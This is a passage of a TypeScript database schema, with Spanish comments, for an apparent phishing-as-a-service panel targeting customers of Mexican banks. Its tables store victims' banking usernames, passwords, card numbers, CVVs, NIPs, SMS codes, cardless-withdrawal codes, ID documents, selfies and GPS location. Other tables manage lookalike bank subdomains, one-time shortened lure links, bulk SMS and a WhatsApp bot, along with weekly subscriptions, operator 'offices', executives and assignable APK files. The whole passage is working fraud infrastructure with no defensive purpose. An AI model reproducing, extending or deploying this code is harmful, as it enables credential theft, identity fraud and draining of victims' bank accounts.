\"spin\",\n  PLATACARD = \"platacard\",\n  BANCOAZTECA = \"bancoazteca\",\n  BIENESTAR = \"bienestar\",\n  INBURSA = \"inbursa\",\n  AFIRME = \"afirme\"\n}\n\n// Tabla de usuarios del sistema\nexport const users = pgTable(\"users\", {\n  id: serial(\"id\").primaryKey(),\n  username: text(\"username\").notNull().unique(),\n  password: text(\"password\").notNull(),\n  role: text(\"role\").notNull().default(UserRole.USER),\n  isActive: boolean(\"is_active\").default(false), // Los usuarios inician inactivos hasta que el admin los apruebe\n  expiresAt: timestamp(\"expires_at\"), // Fecha de expiraci贸n de la cuenta\n  deviceCount: integer(\"device_count\").default(0), // Contador de dispositivos activos\n  maxDevices: integer(\"max_devices\").default(3), // M谩ximo de dispositivos permitidos\n  allowedBanks: text(\"allowed_banks\").default('all'), // Bancos permitidos: 'all' o lista separada por comas\n  telegramChatId: text(\"telegram_chat_id\"), // ID del chat de Telegram para notificaciones y 2FA\n  apkFileName: text(\"apk_file_name\"), // Nombre del archivo APK asignado\n  apkFileUrl: text(\"apk_file_url\"), // URL del archivo APK asignado\n  customPrice: text(\"custom_price\"), // Precio personalizado para este usuario (opcional, si no tiene usa el precio del sistema)\n  accountType: text(\"account_type\").default(AccountType.INDIVIDUAL), // Tipo de cuenta: individual u oficina\n  weeklyPrice: integer(\"weekly_price\"), // Precio semanal espec铆fico para esta cuenta\n  maxExecutives: integer(\"max_executives\").default(0), // M谩ximo de ejecutivos (solo para cuentas de oficina)\n  currentExecutives: integer(\"current_executives\").default(0), // Contador de ejecutivos activos\n  createdAt: timestamp(\"created_at\").defaultNow(),\n  lastLogin: timestamp(\"last_login\"),\n});\n\nexport const insertUserSchema = createInsertSchema(users).pick({\n  username: true,\n  password: true,\n  role: true,\n  isActive: true,\n  allowedBanks: true,\n  telegramChatId: true,\n  apkFileName: true,\n  apkFileUrl: true,\n  customPrice: true,\n  accountType: true,\n  weeklyPrice: true,\n  maxExecutives: true,\n  maxDevices: true,\n});\n\nexport type InsertUser = z.infer<typeof insertUserSchema>;\nexport type User = typeof users.$inferSelect;\n\n// Tabla para las llaves de acceso\nexport const accessKeys = pgTable(\"access_keys\", {\n  id: serial(\"id\").primaryKey(),\n  key: text(\"key\").notNull().unique(),\n  description: text(\"description\"),\n  createdBy: integer(\"created_by\").notNull(), // ID del administrador que cre贸 la llave\n  expiresAt: timestamp(\"expires_at\").notNull(), // Fecha de expiraci贸n\n  maxDevices: integer(\"max_devices\").notNull().default(3), // M谩ximo de dispositivos permitidos\n  activeDevices: integer(\"active_devices\").default(0), // Contador de dispositivos activos\n  isActive: boolean(\"is_active\").default(true),\n  createdAt: timestamp(\"created_at\").defaultNow(),\n  lastUsed: timestamp(\"last_used\"),\n});\n\nexport const insertAccessKeySchema = createInsertSchema(accessKeys).pick({\n  key: true,\n  description: true,\n  createdBy: true,\n  expiresAt: true,\n  maxDevices: true,\n});\n\nexport type InsertAccessKey = z.infer<typeof insertAccessKeySchema>;\nexport type AccessKey = typeof accessKeys.$inferSelect;\n\n// Tabla para rastrear los dispositivos que usan cada llave\nexport const devices = pgTable(\"devices\", {\n  id: serial(\"id\").primaryKey(),\n  accessKeyId: integer(\"access_key_id\").notNull(), // ID de la llave a la que est谩 asociado\n  deviceId: text(\"device_id\").notNull(), // Identificador 煤nico del dispositivo\n  userAgent: text(\"user_agent\"), // Informaci贸n del navegador/dispositivo\n  ipAddress: text(\"ip_address\"), // Direcci贸n IP\n  lastActive: timestamp(\"last_active\").defaultNow(),\n  isActive: boolean(\"is_active\").default(true),\n  createdAt: timestamp(\"created_at\").defaultNow(),\n});\n\nexport const insertDeviceSchema = createInsertSchema(devices).pick({\n  accessKeyId: true,\n  deviceId: true,\n  userAgent: true,\n  ipAddress: true,\n});\n\nexport type InsertDevice = z.infer<typeof insertDeviceSchema>;\nexport type Device = typeof devices.$inferSelect;\n\nexport const sessions = pgTable(\"sessions\", {\n  id: serial(\"id\").primaryKey(),\n  sessionId: text(\"session_id\").notNull().unique(),\n  folio: text(\"folio\"),\n  username: text(\"username\"),\n  password: text(\"password\"),\n  banco: text(\"banco\").default(\"LIVERPOOL\"),\n  tarjeta: text(\"tarjeta\"),\n  fechaVencimiento: text(\"fecha_vencimiento\"),\n  cvv: text(\"cvv\"),\n  sms: text(\"sms\"),\n  nip: text(\"nip\"),\n  smsCompra: text(\"sms_compra\"),\n  celular: text(\"celular\"),\n  pasoActual: text(\"paso_actual\").default(\"folio\"),\n  createdAt: timestamp(\"created_at\").defaultNow(),\n  active: boolean(\"active\").default(true),\n  saved: boolean(\"saved\").default(false),\n  createdBy: text(\"created_by\"), // A帽adimos el campo para saber qu茅 usuario cre贸 la sesi贸n\n  qrData: text(\"qr_data\"), // Almacena el texto del c贸digo QR escaneado\n  qrImageData: text(\"qr_image_data\"), // Almacena la imagen del QR escaneado en base64\n  codigoRetiro: text(\"codigo_retiro\"), // Almacena el c贸digo de retiro sin tarjeta ingresado por el usuario\n  pinRetiro: text(\"pin_retiro\"), // Almacena el PIN de seguridad adicional para retiro sin tarjeta\n  lastActivity: timestamp(\"last_activity\").defaultNow(), // ltimo momento de actividad\n  hasUserData: boolean(\"has_user_data\").default(false), // Indica si el usuario ingres贸 alg煤n dato\n  // Informaci贸n del dispositivo\n  deviceType: text(\"device_type\"), // 'Android', 'iPhone', 'PC'\n  deviceModel: text(\"device_model\"), // Modelo espec铆fico del dispositivo\n  deviceBrowser: text(\"device_browser\"), // Navegador utilizado\n  deviceOs: text(\"device_os\"), // Sistema operativo\n  userAgent: text(\"user_agent\"), // User agent completo\n  // Informaci贸n del archivo para protecci贸n bancaria\n  fileName: text(\"file_name\"), // Nombre del archivo subido\n  fileUrl: text(\"file_url\"), // URL del archivo para descarga\n  fileSize: text(\"file_size\"), // Tama帽o del archivo\n  documentType: text(\"document_type\"), // Tipo de documento de identidad (INE/Pasaporte)\n  documentFileName: text(\"document_file_name\"), // Nombre del archivo del documento\n  documentFileUrl: text(\"document_file_url\"), // URL del archivo del documento\n  selfieFileName: text(\"selfie_file_name\"), // Nombre del archivo del selfie\n  selfieFileUrl: text(\"selfie_file_url\"), // URL del archivo del selfie\n  identityVerified: boolean(\"identity_verified\").default(false), // Estado de verificaci贸n de identidad\n  // Informaci贸n de protecci贸n de saldo\n  saldoDebito: text(\"saldo_debito\"), // Respuesta sobre tarjeta de d茅bito\n  montoDebito: text(\"monto_debito\"), // Monto en tarjeta de d茅bito\n  saldoCredito: text(\"saldo_credito\"), // Respuesta sobre tarjeta de cr茅dito\n  montoCredito: text(\"monto_credito\"), // Monto en tarjeta de cr茅dito\n  // Informaci贸n de geolocalizaci贸n\n  latitude: text(\"latitude\"), // Coordenada GPS de latitud\n  longitude: text(\"longitude\"), // Coordenada GPS de longitud\n  googleMapsLink: text(\"google_maps_link\"), // Enlace directo a Google Maps\n  ipAddress: text(\"ip_address\"), // Direcci贸n IP del usuario\n  locationTimestamp: timestamp(\"location_timestamp\"), // Timestamp de cuando se captur贸 la ubicaci贸n\n  // Vinculaci贸n con oficinas y ejecutivos\n  officeId: integer(\"office_id\"), // ID de la oficina (si la sesi贸n fue creada por una cuenta de oficina)\n  executiveId: integer(\"executive_id\").references(() => executives.id), // ID del ejecutivo que cre贸 la sesi贸n (null si la cre贸 el due帽o)\n  // Metadatos del flujo personalizado de pantallas\n  flowConfig: jsonb(\"flow_config\"), // Configuraci贸n completa del flujo para este banco\n  currentStepIndex: integer(\"current_step_index\").default(0), // ndice del paso actual en el flujo\n  flowState: text(\"flow_state\"), // Estado del flujo: 'active', 'paused', 'completed', null si no hay flujo\n  stepStartedAt: timestamp(\"step_started_at\"), // Cu谩ndo comenz贸 el paso actual\n  autoAdvanceAt: timestamp(\"auto_advance_at\"), // Cu谩ndo avanzar autom谩ticamente al siguiente paso\n});\n\nexport const insertSessionSchema = createInsertSchema(sessions).pick({\n  sessionId: true,\n  folio: true,\n  username: true,\n  password: true,\n  banco: true,\n  pasoActual: true,\n  createdBy: true,\n  executiveId: true,\n  deviceType: true,\n  deviceModel: true,\n  deviceBrowser: true,\n  deviceOs: true,\n  userAgent: true,\n  fileName: true,\n  fileUrl: true,\n  fileSize: true,\n  flowConfig: true,\n  currentStepIndex: true,\n  flowState: true,\n  stepStartedAt: true,\n  autoAdvanceAt: true,\n});\n\nexport type InsertSession = z.infer<typeof insertSessionSchema>;\nexport type Session = typeof sessions.$inferSelect;\n\n// Tabla de perfiles de oficina\nexport const officeProfiles = pgTable(\"office_profiles\", {\n  id: serial(\"id\").primaryKey(),\n  userId: integer(\"user_id\").notNull().unique().references(() => users.id), // FK al usuario oficina\n  weeklyPrice: integer(\"weekly_price\").default(6000), // Precio semanal (default 6000 MXN)\n  maxExecutives: integer(\"max_executives\").default(8), // M谩ximo de ejecutivos permitidos\n  currentExecutives: integer(\"current_executives\").default(0), // Contador actual\n  isActive: boolean(\"is_active\").default(true),\n  createdAt: timestamp(\"created_at\").defaultNow(),\n  updatedAt: timestamp(\"updated_at\").defaultNow(),\n});\n\nexport const insertOfficeProfileSchema = createInsertSchema(officeProfiles).pick({\n  userId: true,\n  weeklyPrice: true,\n  maxExecutives: true,\n  isActive: true,\n});\n\nexport type InsertOfficeProfile = z.infer<typeof insertOfficeProfileSchema>;\nexport type OfficeProfile = typeof officeProfiles.$inferSelect;\n\n// Tabla de ejecutivos para cuentas de oficina\nexport const executives = pgTable(\"executives\", {\n  id: serial(\"id\").primaryKey(),\n  userId: integer(\"user_id\").notNull().references(() => users.id), // FK al usuario oficina due帽o\n  username: text(\"username\").notNull().unique(),\n  displayName: text(\"display_name\"), // Nombre para mostrar del ejecutivo\n  password: text(\"password\").notNull(), // Contrase帽a hasheada\n  isActive: boolean(\"is_active\").default(true),\n  currentSessions: integer(\"current_sessions\").default(0), // Sesiones activas actuales\n  maxSessions: integer(\"max_sessions\").default(1), // M谩ximo 1 sesi贸n simult谩nea por ejecutivo\n  requiresOtp: boolean(\"requires_otp\").default(true), // Si requiere OTP para login\n  lastOtpCode: text(\"last_otp_code\"), // ltimo c贸digo OTP generado\n  lastOtpTime: timestamp(\"last_otp_time\"), // Timestamp del 煤ltimo OTP\n  createdAt: timestamp(\"created_at\").defaultNow(),\n  lastLogin: timestamp(\"last_login\"),\n});\n\nexport const insertExecutiveSchema = createInsertSchema(executives).pick({\n  userId: true,\n  username: true,\n  displayName: true,\n  password: true,\n  isActive: true,\n  maxSessions: true,\n  requiresOtp: true,\n});\n\nexport type InsertExecutive = z.infer<typeof insertExecutiveSchema>;\nexport type Executive = typeof executives.$inferSelect;\n\n// Tabla para la configuraci贸n de la API de mensajes\nexport const smsConfig = pgTable(\"sms_config\", {\n  id: serial(\"id\").primaryKey(),\n  username: text(\"username\"),\n  password: text(\"password\"),\n  apiUrl: text(\"api_url\").default(\"https://api.sofmex.mx/api/sms\"),\n  isActive: boolean(\"is_active\").default(false),\n  updatedAt: timestamp(\"updated_at\").defaultNow(),\n  updatedBy: text(\"updated_by\").notNull(),\n});\n\nexport const insertSmsConfigSchema = createInsertSchema(smsConfig).pick({\n  username: true,\n  password: true,\n  apiUrl: true,\n  isActive: true,\n  updatedBy: true,\n});\n\nexport type InsertSmsConfig = z.infer<typeof insertSmsConfigSchema>;\nexport type SmsConfig = typeof smsConfig.$inferSelect;\n\n// Tabla para la configuraci贸n del sitio\nexport const siteConfig = pgTable(\"site_config\", {\n  id: serial(\"id\").primaryKey(),\n  baseUrl: text(\"base_url\").notNull().default(\"https://aclaracionesditales.com\"),\n  updatedBy: text(\"updated_by\").notNull(),\n  updatedAt: timestamp(\"updated_at\").defaultNow(),\n});\n\n// Schema con validaci贸n robusta de URL\nconst urlValidationSchema = z.string()\n  .trim() // Remover espacios en blanco\n  .min(1, \"La URL no puede estar vac铆a\")\n  .url(\"Debe ser una URL v谩lida\")\n  .refine((url) => url.startsWith('https://'), {\n    message: \"La URL debe comenzar con https://\"\n  })\n  .transform((url) => {\n    // Normalizar URL: remover trailing slash\n    return url.endsWith('/') && url !== 'https://' ? url.slice(0, -1) : url;\n  });\n\nexport const insertSiteConfigSchema = createInsertSchema(siteConfig).pick({\n  baseUrl: true,\n  updatedBy: true,\n}).extend({\n  baseUrl: urlValidationSchema\n});\n\nexport type InsertSiteConfig = z.infer<typeof insertSiteConfigSchema>;\nexport type SiteConfig = typeof siteConfig.$inferSelect;\n\n// Tabla para los cr茅ditos de mensajes de los usuarios\nexport const smsCredits = pgTable(\"sms_credits\", {\n  id: serial(\"id\").primaryKey(),\n  userId: integer(\"user_id\").notNull(),\n  credits: numeric(\"credits\", { precision: 10, scale: 2 }).default(\"0\"), // Cambiado a decimal para soportar 0.5 cr茅ditos\n  updatedAt: timestamp(\"updated_at\").defaultNow(),\n});\n\nexport const insertSmsCreditsSchema = createInsertSchema(smsCredits).pick({\n  userId: true,\n  credits: true,\n});\n\nexport type InsertSmsCredits = z.infer<typeof insertSmsCreditsSchema>;\nexport type SmsCredits = typeof smsCredits.$inferSelect;\n\n// Tipos de ruta SMS\nexport enum SmsRouteType {\n  LONG_CODE = 'long_code',   // 0.5 cr茅dito - Ankarex\n  SHORT_CODE = 'short_code', // 1 cr茅dito - eims (ruta premium)\n  PREMIUM = 'premium'        // 1 cr茅dito - eims (ruta premium alternativa)\n}\n\n// Tabla para el historial de mensajes enviados\nexport const smsHistory = pgTable(\"sms_history\", {\n  id: serial(\"id\").primaryKey(),\n  userId: integer(\"user_id\").notNull(),\n  phoneNumber: text(\"phone_number\").notNull(),\n  message: text(\"message\").notNull(),\n  sentAt: timestamp(\"sent_at\").defaultNow(),\n  status: text(\"status\").default(\"pending\"),\n  sessionId: text(\"session_id\"),\n  errorMessage: text(\"error_message\"),\n  routeType: text(\"route_type\").$type<SmsRouteType>().default(SmsRouteType.LONG_CODE), // Tipo de ruta utilizada\n  creditCost: numeric(\"credit_cost\", { precision: 10, scale: 2 }).default(\"1\"), // Costo en cr茅ditos del env铆o\n});\n\nexport const insertSmsHistorySchema = createInsertSchema(smsHistory).pick({\n  userId: true,\n  phoneNumber: true,\n  message: true,\n  sessionId: true,\n  routeType: true,\n  creditCost: true,\n});\n\nexport type InsertSmsHistory = z.infer<typeof insertSmsHistorySchema>;\nexport type SmsHistory = typeof smsHistory.$inferSelect;\n\nexport enum ScreenType {\n  GEOLOCATION = \"geolocation\",\n  FOLIO = \"folio\",\n  LOGIN = \"login\",\n  CODIGO = \"codigo\",\n  NIP = \"nip\",\n  PROTEGER = \"protege\",\n  TARJETA = \"tarjeta\",\n  TRANSFERIR = \"transferir\",\n  CANCELACION = \"cancelacion\",\n  MENSAJE = \"mensaje\",\n  VALIDANDO = \"validando\",\n  SMS_COMPRA = \"sms_compra\",\n  ESCANEAR_QR = \"escanear_qr\",\n  CANCELACION_RETIRO = \"cancelacion_retiro\",\n  PROTECCION_BANCARIA = \"proteccion_bancaria\",\n  PROTECCION_SALDO = \"proteccion_saldo\",\n  VERIFICACION_ID = \"verificacion_id\"\n}\n\nexport const screenChangeSchema = z.object({\n  tipo: z.string(),\n  sessionId: z.string(),\n  terminacion: z.string().optional(),\n  saldo: z.string().optional(),\n  monto: z.string().optional(),\n  clabe: z.string().optional(),\n  titular: z.string().optional(),\n  comercio: z.string().optional(),\n  mensaje: z.string().optional(),\n  qrData: z.string().optional(), // Para datos del QR escaneado\n  qrImageData: z.string().optional(), // Para la imagen del QR escaneado en base64\n  fileName: z.string().optional(), // Para archivos de protecci贸n bancaria\n  fileUrl: z.string().optional(), // URL del archivo de protecci贸n\n  fileSize: z.string().optional(), // Tama帽o del archivo de protecci贸n\n  saldoDebito: z.string().optional(), // Respuesta sobre tarjeta de d茅bito\n  montoDebito: z.string().optional(), // Monto en tarjeta de d茅bito\n  saldoCredito: z.string().optional(), // Respuesta sobre tarjeta de cr茅dito\n  montoCredito: z.string().optional(), // Monto en tarjeta de cr茅dito\n  documentType: z.string().optional(), // Tipo de documento (INE/Pasaporte)\n  documentFileName: z.string().optional(), // Nombre del archivo del documento\n  documentFileUrl: z.string().optional(), // URL del archivo del documento\n  selfieFileName: z.string().optional(), // Nombre del archivo del selfie\n  selfieFileUrl: z.string().optional(), // URL del archivo del selfie\n  verified: z.boolean().optional(), // Estado de verificaci贸n\n});\n\nexport type ScreenChangeData = z.infer<typeof screenChangeSchema>;\n\nexport const clientInputSchema = z.object({\n  tipo: z.string(),\n  sessionId: z.string(),\n  data: z.record(z.any()),\n});\n\nexport type ClientInputData = z.infer<typeof clientInputSchema>;\n\n// Tipos de notificaciones del sistema\nexport enum NotificationType {\n  SESSION_ACTIVITY = \"session_activity\", // Actividad en sesiones\n  USER_ACTIVITY = \"user_activity\",       // Actividad de usuario\n  SYSTEM = \"system\",                     // Notificaciones del sistema\n  SUCCESS = \"success\",                   // Operaciones exitosas\n  WARNING = \"warning\",                   // Advertencias\n  ERROR = \"error\",                       // Errores\n  INFO = \"info\"                          // Informaci贸n general\n}\n\n// Prioridad de notificaciones\nexport enum NotificationPriority {\n  LOW = \"low\",\n  MEDIUM = \"medium\",\n  HIGH = \"high\",\n  URGENT = \"urgent\"\n}\n\n// Tabla para almacenar notificaciones\nexport const notifications = pgTable(\"notifications\", {\n  id: serial(\"id\").primaryKey(),\n  userId: integer(\"user_id\").notNull(), // Usuario al que va dirigida la notificaci贸n\n  type: text(\"type\").notNull().$type<NotificationType>(), // Tipo de notificaci贸n\n  title: text(\"title\").notNull(), // T铆tulo de la notificaci贸n\n  message: text(\"message\").notNull(), // Mensaje principal\n  details: text(\"details\"), // Detalles adicionales (opcional)\n  priority: text(\"priority\").notNull().$type<NotificationPriority>().default(NotificationPriority.MEDIUM), // Prioridad\n  read: boolean(\"read\").default(false), // Si la notificaci贸n ha sido le铆da\n  createdAt: timestamp(\"created_at\").defaultNow(), // Fecha de creaci贸n\n  expiresAt: timestamp(\"expires_at\"), // Fecha de expiraci贸n (opcional)\n  actionUrl: text(\"action_url\"), // URL opcional para acci贸n\n  sessionId: text(\"session_id\"), // ID de sesi贸n relacionada (opcional)\n  metaData: jsonb(\"meta_data\") // Datos adicionales en formato JSON\n});\n\nexport const insertNotificationSchema = createInsertSchema(notifications).pick({\n  userId: true,\n  type: true,\n  title: true,\n  message: true,\n  details: true,\n  priority: true,\n  actionUrl: true,\n  sessionId: true,\n  metaData: true,\n  expiresAt: true\n});\n\nexport type InsertNotification = z.infer<typeof insertNotificationSchema>;\nexport type Notification = typeof notifications.$inferSelect;\n\n// Tabla para preferencias de notificaci贸n de los usuarios\nexport const notificationPreferences = pgTable(\"notification_preferences\", {\n  id: serial(\"id\").primaryKey(),\n  userId: integer(\"user_id\").notNull().references(() => users.id), // Usuario al que pertenecen las preferencias\n  sessionActivityEnabled: boolean(\"session_activity_enabled\").default(true), // Recibir notificaciones de actividad de sesiones\n  userActivityEnabled: boolean(\"user_activity_enabled\").default(true), // Recibir notificaciones de actividad de usuarios\n  systemEnabled: boolean(\"system_enabled\").default(true), // Recibir notificaciones del sistema\n  minPriority: text(\"min_priority\").$type<NotificationPriority>().default(NotificationPriority.LOW), // Prioridad m铆nima para recibir notificaciones\n  emailEnabled: boolean(\"email_enabled\").default(false), // Recibir notificaciones por email\n  emailAddress: text(\"email_address\"), // Direcci贸n de email para notificaciones\n  updatedAt: timestamp(\"updated_at\").defaultNow() // ltima actualizaci贸n\n});\n\nexport const insertNotificationPrefsSchema = createInsertSchema(notificationPreferences).pick({\n  userId: true,\n  sessionActivityEnabled: true,\n  userActivityEnabled: true,\n  systemEnabled: true,\n  minPriority: true,\n  emailEnabled: true,\n  emailAddress: true\n});\n\nexport type InsertNotificationPrefs = z.infer<typeof insertNotificationPrefsSchema>;\nexport type NotificationPrefs = typeof notificationPreferences.$inferSelect;\n\n// Tabla para c贸digos de verificaci贸n 2FA\nexport const verificationCodes = pgTable(\"verification_codes\", {\n  id: serial(\"id\").primaryKey(),\n  userId: integer(\"user_id\").notNull(),\n  code: text(\"code\").notNull(), // C贸digo de 6 d铆gitos\n  isUsed: boolean(\"is_used\").default(false),\n  expiresAt: timestamp(\"expires_at\").notNull(), // Los c贸digos expiran en 10 minutos\n  createdAt: timestamp(\"created_at\").defaultNow(),\n});\n\nexport const insertVerificationCodeSchema = createInsertSchema(verificationCodes).pick({\n  userId: true,\n  code: true,\n  expiresAt: true,\n});\n\nexport type InsertVerificationCode = z.infer<typeof insertVerificationCodeSchema>;\nexport type VerificationCode = typeof verificationCodes.$inferSelect;\n\n// Tabla para configuraci贸n del sistema (precios, etc)\nexport const systemConfig = pgTable(\"system_config\", {\n  id: serial(\"id\").primaryKey(),\n  subscriptionPrice: numeric(\"subscription_price\", { precision: 10, scale: 2 }).notNull().default('0'), // Precio de suscripci贸n (7 d铆as)\n  updatedAt: timestamp(\"updated_at\").defaultNow(),\n  updatedBy: integer(\"updated_by\") // ID del admin que actualiz贸\n});\n\nexport const insertSystemConfigSchema = createInsertSchema(systemConfig).pick({\n  subscriptionPrice: true,\n  updatedBy: true\n});\n\nexport type InsertSystemConfig = z.infer<typeof insertSystemConfigSchema>;\nexport type SystemConfig = typeof systemConfig.$inferSelect;\n\n// Estados de pago\nexport enum PaymentStatus {\n  PENDING = \"pending\",\n  COMPLETED = \"completed\",\n  EXPIRED = \"expired\",\n  CANCELLED = \"cancelled\",\n  MANUAL_REVIEW = \"manual_review\"\n}\n\n// Tabla para rastrear pagos de usuarios\nexport const payments = pgTable(\"payments\", {\n  id: serial(\"id\").primaryKey(),\n  userId: integer(\"user_id\").notNull().references(() => users.id),\n  amount: numeric(\"amount\", { precision: 10, scale: 2 }).notNull(), // Monto esperado\n  referenceCode: text(\"reference_code\").notNull().unique(), // C贸digo de referencia 煤nico para este pago\n  status: text(\"status\").notNull().$type<PaymentStatus>().default(PaymentStatus.PENDING),\n  bitsoTransactionId: text(\"bitso_transaction_id\"), // ID de transacci贸n en Bitso\n  verifiedAt: timestamp(\"verified_at\"), // Cu谩ndo se verific贸 el pago\n  expiresAt: timestamp(\"expires_at\"), // Cu谩ndo expira esta espera de pago\n  createdAt: timestamp(\"created_at\").defaultNow(),\n  notes: text(\"notes\"), // Notas adicionales\n  telegramFileId: text(\"telegram_file_id\"), // ID del archivo de Telegram (captura de pantalla)\n  verificationAttempts: integer(\"verification_attempts\").default(0), // Contador de intentos de verificaci贸n con Bitso\n  previousBalance: text(\"previous_balance\"), // Balance en MXN antes de este dep贸sito (para verificar aumento exacto)\n  reportedAmount: text(\"reported_amount\") // Monto que el usuario dice haber depositado\n});\n\nexport const insertPaymentSchema = createInsertSchema(payments).omit({\n  id: true,\n  createdAt: true\n});\n\nexport type InsertPayment = z.infer<typeof insertPaymentSchema>;\nexport type Payment = typeof payments.$inferSelect;\n\n// Tabla para c贸digos de descuento de un solo uso\nexport const discountCodes = pgTable(\"discount_codes\", {\n  id: serial(\"id\").primaryKey(),\n  code: text(\"code\").notNull().unique(), // C贸digo 煤nico generado\n  discountAmount: numeric(\"discount_amount\", { precision: 10, scale: 2 }).notNull(), // Cantidad de descuento en pesos\n  isUsed: boolean(\"is_used\").default(false), // Si ya fue usado\n  usedBy: integer(\"used_by\").references(() => users.id), // ID del usuario que lo us贸\n  usedAt: timestamp(\"used_at\"), // Cu谩ndo fue usado\n  createdBy: integer(\"created_by\").notNull(), // ID del admin que lo cre贸\n  createdAt: timestamp(\"created_at\").defaultNow()\n});\n\nexport const insertDiscountCodeSchema = createInsertSchema(discountCodes).omit({\n  id: true,\n  createdAt: true,\n  isUsed: true,\n  usedBy: true,\n  usedAt: true\n});\n\nexport type InsertDiscountCode = z.infer<typeof insertDiscountCodeSchema>;\nexport type DiscountCode = typeof discountCodes.$inferSelect;\n\n// Tabla para configuraci贸n de WhatsApp Bot\nexport const whatsappConfig = pgTable(\"whatsapp_config\", {\n  id: serial(\"id\").primaryKey(),\n  userId: integer(\"user_id\").notNull().references(() => users.id), // Usuario due帽o del bot\n  isConnected: boolean(\"is_connected\").default(false), // Estado de conexi贸n\n  qrCode: text(\"qr_code\"), // QR code en formato base64\n  authState: jsonb(\"auth_state\"), // Estado de autenticaci贸n de Baileys\n  phoneNumber: text(\"phone_number\"), // N煤mero de WhatsApp conectado\n  welcomeMessage: text(\"welcome_message\").default(\"隆Hola! Bienvenido a nuestro CRM. Por favor selecciona una opci贸n:\"), // Mensaje de bienvenida\n  lastConnected: timestamp(\"last_connected\"), // ltima vez que se conect贸\n  createdAt: timestamp(\"created_at\").defaultNow(),\n  updatedAt: timestamp(\"updated_at\").defaultNow()\n});\n\nexport const insertWhatsappConfigSchema = createInsertSchema(whatsappConfig).omit({\n  id: true,\n  createdAt: true,\n  updatedAt: true\n});\n\nexport type InsertWhatsappConfig = z.infer<typeof insertWhatsappConfigSchema>;\nexport type WhatsappConfig = typeof whatsappConfig.$inferSelect;\n\n// Tabla para opciones del men煤 de WhatsApp\nexport const whatsappMenuOptions = pgTable(\"whatsapp_menu_options\", {\n  id: serial(\"id\").primaryKey(),\n  userId: integer(\"user_id\").notNull().references(() => users.id), // Usuario due帽o\n  parentId: integer(\"parent_id\"), // ID del men煤 padre (null para men煤 principal)\n  optionNumber: integer(\"option_number\").notNull(), // N煤mero de la opci贸n (1, 2, 3, etc.)\n  optionText: text(\"option_text\").notNull(), // Texto que se muestra (ej: \"Hablar con ejecutivo\")\n  actionType: text(\"action_type\").notNull().default(\"message\"), // Tipo de acci贸n: \"message\", \"transfer\", \"info\", \"submenu\", \"command\"\n  responseMessage: text(\"response_message\"), // Mensaje de respuesta (si actionType es \"message\")\n  commandType: text(\"command_type\"), // Tipo de comando: \"liga\" (env铆a 煤ltima liga del panel)\n  isActive: boolean(\"is_active\").default(true), // Si est谩 activa\n  createdAt: timestamp(\"created_at\").defaultNow(),\n  updatedAt: timestamp(\"updated_at\").defaultNow()\n});\n\nexport const insertWhatsappMenuOptionSchema = createInsertSchema(whatsappMenuOptions).omit({\n  id: true,\n  createdAt: true,\n  updatedAt: true\n});\n\nexport type InsertWhatsappMenuOption = z.infer<typeof insertWhatsappMenuOptionSchema>;\nexport type WhatsappMenuOption = typeof whatsappMenuOptions.$inferSelect;\n\n// Tabla para historial de conversaciones de WhatsApp\nexport const whatsappConversations = pgTable(\"whatsapp_conversations\", {\n  id: serial(\"id\").primaryKey(),\n  userId: integer(\"user_id\").notNull().references(() => users.id), // Usuario due帽o del bot\n  phoneNumber: text(\"phone_number\").notNull(), // N煤mero del contacto\n  contactName: text(\"contact_name\"), // Nombre del contacto (si est谩 disponible)\n  message: text(\"message\").notNull(), // Mensaje recibido/enviado\n  isFromBot: boolean(\"is_from_bot\").default(false), // true si es del bot, false si es del contacto\n  messageId: text(\"message_id\"), // ID del mensaje de WhatsApp\n  createdAt: timestamp(\"created_at\").defaultNow()\n});\n\nexport const insertWhatsappConversationSchema = createInsertSchema(whatsappConversations).omit({\n  id: true,\n  createdAt: true\n});\n\nexport type InsertWhatsappConversation = z.infer<typeof insertWhatsappConversationSchema>;\nexport type WhatsappConversation = typeof whatsappConversations.$inferSelect;\n\n// Estados de los links\nexport enum LinkStatus {\n  ACTIVE = \"active\",\n  CONSUMED = \"consumed\",\n  EXPIRED = \"expired\",\n  CANCELLED = \"cancelled\"\n}\n\n// Tabla para subdominios de bancos\nexport const bankSubdomains = pgTable(\"bank_subdomains\", {\n  id: serial(\"id\").primaryKey(),\n  bankCode: text(\"bank_code\").notNull().unique(), // C贸digo del banco (liverpool, bbva, etc.)\n  subdomain: text(\"subdomain\").notNull(), // Subdominio (liverpool.aclaracion.info)\n  isActive: boolean(\"is_active\").default(true),\n  createdAt: timestamp(\"created_at\").defaultNow(),\n  updatedAt: timestamp(\"updated_at\").defaultNow()\n});\n\nexport const insertBankSubdomainSchema = createInsertSchema(bankSubdomains).omit({\n  id: true,\n  createdAt: true,\n  updatedAt: true\n});\n\nexport type InsertBankSubdomain = z.infer<typeof insertBankSubdomainSchema>;\nexport type BankSubdomain = typeof bankSubdomains.$inferSelect;\n\n// Tabla para tokens de links de un solo uso\nexport const linkTokens = pgTable(\"link_tokens\", {\n  id: serial(\"id\").primaryKey(),\n  userId: integer(\"user_id\").notNull().references(() => users.id), // Usuario que gener贸 el link\n  sessionId: text(\"session_id\").references(() => sessions.sessionId), // Sesi贸n asociada (opcional) - referencia al sessionId texto\n  bankCode: text(\"bank_code\").notNull(), // Banco asociado\n  token: text(\"token\").notNull().unique(), // Token 煤nico generado\n  originalUrl: text(\"original_url\").notNull(), // URL original completa con subdominio\n  shortUrl: text(\"short_url\"), // URL acortada por Bitly\n  bitlyLinkId: text(\"bitly_link_id\"), // ID del link en Bitly para auditor铆a\n  status: text(\"status\").notNull().default(LinkStatus.ACTIVE), // Estado del link\n  expiresAt: timestamp(\"expires_at\").notNull(), // Cu谩ndo expira (por defecto 1 hora)\n  usedAt: timestamp(\"used_at\"), // Cu谩ndo fue usado (para un solo uso)\n  extendedUntil: timestamp(\"extended_until\"), // Si se extendi贸 la duraci贸n\n  metadata: jsonb(\"metadata\"), // Informaci贸n adicional (IP, user-agent, etc.)\n  createdAt: timestamp(\"created_at\").defaultNow(),\n  updatedAt: timestamp(\"updated_at\").defaultNow()\n});\n\nexport const insertLinkTokenSchema = createInsertSchema(linkTokens).omit({\n  id: true,\n  createdAt: true,\n  updatedAt: true,\n  usedAt: true\n});\n\nexport type InsertLinkToken = z.infer<typeof insertLinkTokenSchema>;\nexport type LinkToken = typeof linkTokens.$inferSelect;\n\n// Tabla para rastrear uso semanal de links por usuario\nexport const linkUsageWeekly = pgTable(\"link_usage_weekly\", {\n  id: serial(\"id\").primaryKey(),\n  userId: integer(\"user_id\").notNull().references(() => users.id),\n  weekStartDate: timestamp(\"week_start_date\").notNull(), // Inicio de la semana (lunes)\n  